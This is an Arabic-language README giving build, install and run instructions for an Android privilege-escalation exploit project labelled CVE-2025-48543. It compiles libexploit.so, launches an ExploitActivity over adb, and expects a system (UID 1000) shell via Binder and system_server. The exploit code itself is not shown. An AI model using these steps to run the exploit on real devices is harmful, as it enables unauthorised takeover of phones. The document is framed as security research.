# تعليمات البناء والتشغيل

## 🚀 خطوات البناء السريعة

### الطريقة 1: استخدام NDK مباشرة

```bash
# 1. تعيين متغيرات البيئة
export ANDROID_NDK_HOME=/path/to/android-ndk-r21e
export ANDROID_HOME=/path/to/android-sdk

# 2. البناء
cd jni
$ANDROID_NDK_HOME/ndk-build

# 3. المكتبة ستكون في: libs/armeabi-v7a/libexploit.so
```

### الطريقة 2: استخدام Gradle

```bash
# 1. تحديث build.gradle إذا لزم الأمر
# 2. البناء
./gradlew assembleDebug

# 3. تثبيت على الجهاز
adb install app/build/outputs/apk/debug/app-debug.apk
```

### الطريقة 3: استخدام Makefile

```bash
make build NDK_HOME=/path/to/android-ndk
```

## 📱 التثبيت على الجهاز

```bash
# تفعيل USB Debugging على الجهاز
# ثم:
adb devices

# تثبيت APK
adb install -r app-debug.apk

# تشغيل التطبيق
adb shell am start -n com.example.cve202548543/.ExploitActivity

# مراقبة Logcat
adb logcat | grep CVE-2025-48543
```

## 🔍 التحقق من النتيجة

بعد التنفيذ، تحقق من:

```bash
# 1. فحص UID الحالي
adb shell id

# 2. محاولة الوصول إلى shell بصلاحيات system
adb shell

# 3. فحص Logcat للأخطاء
adb logcat -d | grep -i "exploit\|error\|shellcode"
```

## ⚠️ ملاحظات مهمة

1. **قد لا يعمل على أجهزة حقيقية**: بسبب الحماية الحديثة
2. **يتطلب Android 5.0+**: للوصول إلى Binder APIs
3. **قد يحتاج Root**: للوصول إلى system_server
4. **للبحث الأمني فقط**: الاستخدام غير القانوني محظور

## 🐛 حل المشاكل الشائعة

### خطأ: "NDK not found"
```bash
export ANDROID_NDK_HOME=/path/to/ndk
```

### خطأ: "Binder library not found"
- تأكد من وجود Android Binder headers في المسار الصحيح
- قد تحتاج إلى نسخها من Android source code

### خطأ: "JNI method not found"
- تأكد من تطابق اسم الدالة في Java و C++
- تأكد من تحميل المكتبة بشكل صحيح

## 📊 النتيجة المتوقعة

- **نجاح**: UID-1000 shell
- **فشل محتمل**: Crash أو لا يعمل بسبب الحماية
